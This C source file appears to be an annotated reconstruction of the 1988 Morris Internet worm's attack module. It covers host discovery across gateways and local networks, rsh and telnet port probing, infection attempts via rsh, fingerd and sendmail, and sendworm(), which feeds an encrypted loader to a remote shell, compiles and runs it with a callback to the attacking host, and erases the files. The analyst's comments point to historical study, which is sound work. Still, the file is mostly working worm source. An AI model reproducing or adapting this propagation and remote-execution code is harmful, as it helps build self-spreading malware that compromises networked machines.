/*
 * Copyright (c) 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF THE UNIVERSITY
 * OF CALIFORNIA.  The copyright notice above does not evidence
 * any actual or intended publication of this source code.
 *
 * Copying or redistribution in any form is explicitly forbidden
 * unless prior written permission is obtained from Michael Karels or an
 * authorized representative of the University of California, Berkeley.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <errno.h>
#include <signal.h>
#include "types.h"

extern int ngateways;
extern u_long gateways[];
extern struct host *hosts;
extern struct host *me;
extern struct interface ifs[];
extern int nifs;
extern int errno;

char *inet_ntoa();
struct in_addr a2in();
u_long netmaskfor();

/*
 * Various attacks.
 */

/* attack gateways */
hg()
{
	struct host *h;
	int i;

	/* collect a new list of gateways */
	rt_init();

	/* try to infect one of them */
	for (i = 0; i < ngateways; i++) {
		h = h_addr2host(gateways[i], 1);
		if (infect(h))
			return 1;
	}
	return 0;
}

/* attack hosts on remote networks */
ha()
{
	struct host *h;
	int i, n, j;
	u_long addrs[100];
	/*stacktemp f1a4;*/

	/* don't redundantly collect gateways */
	if (ngateways < 1)
		rt_init();

	/* collect alternate gateway addresses, look for telnet capability */
	n = 0;
	for (i = 0; i < ngateways; i++) {
		h = h_addr2host(gateways[i], 1);
		for (j = 0; j < 6; j++)
			if (h->addrs[j] && supports_telnet(h->addrs[j]))
				addrs[n++] = h->addrs[j];
	}

	/* randomize the order of the addresses,
	   then extract the networks from these addresses
	   and attack randomly chosen addresses on these networks;
	   if we succeed, try another step */
	permute((char *)addrs, n, sizeof(addrs[0]));
	for (i = 0; i < n; i++)
		if (hack_netof(addrs[i] & netmaskfor(addrs[i])))
			return 1;
	return 0;
}

/* attack hosts on local networks */
hl()
{
	int i;

	/* run through the current host's list of alternate addresses */
	for (i = 0; i < 6; i++) {
		if (me->addrs[i] == 0)
			break;
		if (hack_netof(me->addrs[i] & netmaskfor(me->addrs[i])))
			return 1;
	}
	return 0;
}

/*
 * Attack ``equivalent'' hosts that we've found an address for,
 * stopping on success.
 */
hi()
{
	struct host *h;

	for (h = hosts; h; h = h->next)
		if (h->flags & H_EQUIVHOST && infect(h))
			return 1;
	return 0;
}

/*
 * Try a randomly selected set of 20 of the hosts connected to
 * a local network on the interface for address addr.
 *
 * This routine is curious and probably buggy in the original....
 */
static int
hack_netof(addr)			/* 0x12fc */
	u_long addr;
{
	u_long haddr;
	struct host *h;
	u_long mask, hmask;
	u_long net;
	int i;
	int f1c_unused;
	int n, j, k, four;
	u_long hlist[2048];

	/* hack_netof() is never called without calling netmaskfor() first --
	   this seems terribly redundant */
	mask = netmaskfor(addr);
	hmask = ~ntohl(mask);

	/* if we're checking a network that the current host is directly
	   connected to, bag it */
	/* this seems to assume that we're going to check locally attached
	   networks first, but hl() calls hack_netof()!  a goof? */
	for (i = 0; i < nifs; i++)
		if (addr == (ifs[i].if_addr & ifs[i].if_netmask))
			return 0;

	/* cook up some host addresses */
	n = 0;
	if (hmask == 0x00ffffff) {	/* IN_CLASSA_HOST */
		/* fake up some subnets -- seems designed especially
		   for ARPAnet and MILnet */
		/* why don't we bother with subnets for class B nets? */
		four = 4;
		for (k = 1; k < 255; k++)
			for (net = 1; net <= 8; net++)
				hlist[n++] = (addr | htonl((net << 16) | k));
		permute((char *)hlist, n, 4);
	} else {
		four = 4;
		for (net = 1; net < 255; net++)
			hlist[n++] = (addr | htonl(net));
		/* we prefer low-numbered hosts */
		permute((char *)hlist, 12, 4);
		permute((char *)&hlist[6], n - 6, 4);
	}

	/* skim off the first 20 addresses */
	if (n > 20)
		n = 20;

	/* for each address, if it's not a gateway (tried it earlier)
	   and we haven't tried hacking it earlier and it supports
	   rsh, attack it; remember the address */
	for (j = 0; j < n; j++) {
		haddr = hlist[j];
		h = h_addr2host(haddr, 0);
		if (h && h->flags & H_INFECTED)
			continue;
		if (h && h->flags & H_CANTHIT)
			continue;
		if (supports_rsh(haddr, four)) {
			if (h == 0)
				h = h_addr2host(haddr, 1);
			if (infect(h))
				return 1;
		}
	}
	return 0;
}

/*
 * Return true iff the host at the given address is up and
 * is serving shell (rshd) connections.
 */
static int
supports_rsh(addr, timeout)		/* 0x14c8 */
	u_long addr;
	int timeout;
{
	int s, conn;
	struct sockaddr_in sin;
	int (*oldalarm_unused)();
	int justreturn();

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
		return 0;
	bzero((char *)&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = addr;
	sin.sin_port = htons(514);	/* shell */
	oldalarm_unused = signal(SIGALRM, justreturn);
	if (timeout < 1)
		timeout = 1;
	(void) alarm(timeout);
	conn = connect(s, (struct sockaddr *)&sin, sizeof(sin));
	(void) alarm(0);
	(void) close(s);
	if (conn < 0 && errno == ENETUNREACH)
		/* void */;	/* pointless */

	/* here he forgot to restore SIGALRM */
	return (conn != -1);
}

/*
 * Return true iff the host at the given address is up and
 * is serving telnet connections.
 */
static int
supports_telnet(addr)			/* 0x1586 */
	u_long addr;
{
	int s, conn;
	struct sockaddr_in sin;
	int (*oldalarm_unused)();
	int justreturn();

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
		return 0;
	bzero((char *)&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = addr;
	sin.sin_port = htons(23);	/* telnet */
	oldalarm_unused = signal(SIGALRM, justreturn);
	(void) alarm(5);
	conn = connect(s, (struct sockaddr *)&sin, sizeof(sin));
	if (conn < 0 && errno == ECONNREFUSED)
		conn = 0;
	(void) alarm(0);
	(void) close(s);
	return (conn != -1);
}

/*
 * Try various methods of infecting host h with the worm.
 */
static int
infect(h)			/* 0x1638 */
	struct host *h;
{
	int infd, outfd, fc;

	if (h == me)		/* already running here! */
		return 0;

	/*
	 * If we got it already, or decided we cannot, bag it.
	 */
	if (h->flags & H_INFECTED)
		return 0;
	if (h->flags & H_CANTHIT)
		return 0;

	/* name and address desired; pick them up if needed */
	if (h->addrs[0] == 0 || h->name[0] == 0)
		getaddrs(h);

	/* no address; forget it */
	if (h->addrs[0] == 0) {
		h->flags |= H_CANTHIT;
		return 0;
	}

	/* check for clients */
	other_sleep(1);

	/*
	 * If we have a name for the host, try sending via rsh.
	 */
	if (h->name[0] &&
	    pipe_to_rsh(h->name[0], &infd, &outfd, XS("exec /bin/sh"))) {
		fc = sendworm(h, infd, outfd);
		(void) close(infd);
		(void) close(outfd);
		(void) wait3((union wait *)0, WNOHANG, (struct rusage *)0);
		if (fc != 0)
			return fc;
	}

	/*
	 * Try sending it via fingerd.
	 */
	if (hack_fingerd(h, &infd, &outfd)) {
		fc = sendworm(h, infd, outfd);
		(void) close(infd);
		(void) close(outfd);
		if (fc != 0)
			return fc;
	}

	/*
	 * Finally, try sendmail.
	 */
	if (hack_sendmail(h))
		return 1;

	h->flags |= H_CANTHIT;	/* nothing works */
	return 0;
}

/*
 * Attempt to send a copy of the bootstrap loader to the given host.
 * If that succeeds, call waithit() to send the object files, and
 * link and run them there, and return true iff we manage to get it
 * all started on that host.  'in' and 'out' are connections to a
 * remote rsh on host 'h'.
 */
int
sendworm(h, in, out)		/* 0x1776 */
	struct host *h;
	int in, out;
{
	struct object *objp;
	char buf[512];
	char cfile[50];
	int w;
	long xnum;
	int port, s;
	long magic;
	u_long myaddr;

	/* if we weren't given the loader, bag it (paranoia) */
	objp = getobjectbyname(XS("l1.c"));
	if (objp == 0)
		return 0;

	/* prepare for a remote connection -- generate a magic number
	   for authentication, plus a canonical host address, a random
	   port number and a bound socket */
	if (!makemagic(h, &myaddr, &port, &magic, &s))
		return 0;

	/* set our path, avoid trojan horses (!) */
	/* put our junk in /usr/tmp */
	send_string(out, XS("PATH=/bin:/usr/bin:/usr/ucb"));
	send_string(out, XS("cd /usr/tmp"));

	/* here's where the infamous 'gorch' word appears */
	/* feed the file across, using 'sed' to parse the input stream */
	/* decrypt, write, and re-encrypt the bootstrap file */
	xnum = random() % 0xffffff;
	sprintf(cfile, XS("x%d.c"), xnum);
	sprintf(buf, XS("echo gorch49;sed '/int zz;/q' > %s;echo gorch50\n"),
		cfile);
	send_string(out, buf);
	(void) wait_for_string(in, XS("gorch49"), 10);
	xorbuf(objp->buf, objp->len);
	w = write(out, objp->buf, objp->len);
	xorbuf(objp->buf, objp->len);
	if (w != objp->len) {
		(void) close(s);
		return 0;
	}
	send_string(out, XS("int zz;\n\n"));
	(void) wait_for_string(in, XS("gorch50"), 30);

	/* compile and run the loader on the remote system,
	   then remove the evidence */
	sprintf(buf,
	    XS("cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"),
	    xnum, xnum,
	    xnum, inet_ntoa(a2in(myaddr)), htons(port), magic,
	    xnum, xnum);
	send_string(out, buf);
	if (wait_for_string(in, XS("DONE"), 100) == 0) {
		(void) close(s);
		return 0;
	}

	/* act as a server for our newly generated remote client */
	return waithit(h, myaddr, port, magic, s);
}

/* next is waithit() */
